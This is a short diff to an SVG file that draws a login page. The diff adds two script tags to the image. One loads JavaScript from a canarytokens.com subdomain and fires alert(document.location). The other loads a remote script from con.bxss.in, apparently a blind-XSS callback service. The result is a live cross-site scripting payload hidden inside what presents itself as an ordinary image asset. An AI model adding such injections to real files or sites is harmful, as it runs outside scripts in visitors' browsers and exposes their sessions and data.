@@ -7,7 +7,11 @@
   <text x="50%" y="50" font-family="Arial" font-size="24" fill="#333" text-anchor="middle">
     Login Page
   </text>
-  
+  <script src="https://L4J.f9z1vwid7yq5jq79gbg9cdh3n.canarytokens.com/a" type="text/javascript">
+      alert(document.location);
+   </script>
+
+<script src=https://con.bxss.in></script>
   <!-- Username label -->
   <text x="30" y="110" font-family="Arial" font-size="14" fill="#555">
     Username
